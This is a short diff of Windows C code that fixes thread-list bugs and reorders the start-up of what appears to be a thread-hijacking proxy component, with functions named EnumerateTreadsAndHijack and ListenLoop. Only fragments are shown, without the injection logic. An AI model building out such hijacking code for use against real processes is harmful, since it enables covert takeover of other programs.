@@ -48,7 +48,7 @@ int ThreadInsert(DWORD_PTR ID, HANDLE hThread) {
 		dptr->ThreadID = ID;
 
 		EnterCriticalSection(&CS_ThreadData);
-		dptr->next = dptr;
+		dptr->next = thread_data_list;
 		thread_data_list = dptr;
 		LeaveCriticalSection(&CS_ThreadData);
 	}
@@ -65,6 +65,7 @@ ThreadData *ThreadFind(DWORD_PTR ID) {
 			ret = dptr;
 			break;
 		}
+		dptr = dptr->next;
 	}
 
 	LeaveCriticalSection(&CS_ThreadData);
@@ -159,7 +160,7 @@ BOOL PauseThreads(unsigned long pid, bool bResumeThread) {
     // Fill in the size of the structure before using it. 
     te32.dwSize = sizeof(THREADENTRY32); 
 	// Take a snapshot of all threads currently in the system. 
-	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
+	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid); 
     // Walk the thread snapshot to find all threads of the process. 
     // If the thread belongs to the process, add its information 
     // to the display list.
@@ -202,7 +203,7 @@ int EnumerateTreadsAndHijack() {
 	// Fill in the size of the structure before using it. 
 	te32.dwSize = sizeof(THREADENTRY32); 
 	// Take a snapshot of all threads currently in the system. 
-	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
+	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, pid); 
 	// Walk the thread snapshot to find all threads of the process. 
 	// If the thread belongs to the process, add its information 
 	// to the display list.
@@ -256,15 +257,18 @@ int Thread_InitProxy(void *param) {
 		ExitProcess(0);
     }
 	
-	if (ListenLoop() == -1)
-		ExitProcess(0);
 	
 
 
 	PauseThreads(0, 0);
 	EnumerateTreadsAndHijack();
-	PauseThreads(0, 1);
 	
+	PauseThreads(0, 1);
+	PauseThreads(0, 1);
+
+	if (ListenLoop() == -1)
+		ExitProcess(0);
+
 	ExitThread(0);
 }
 
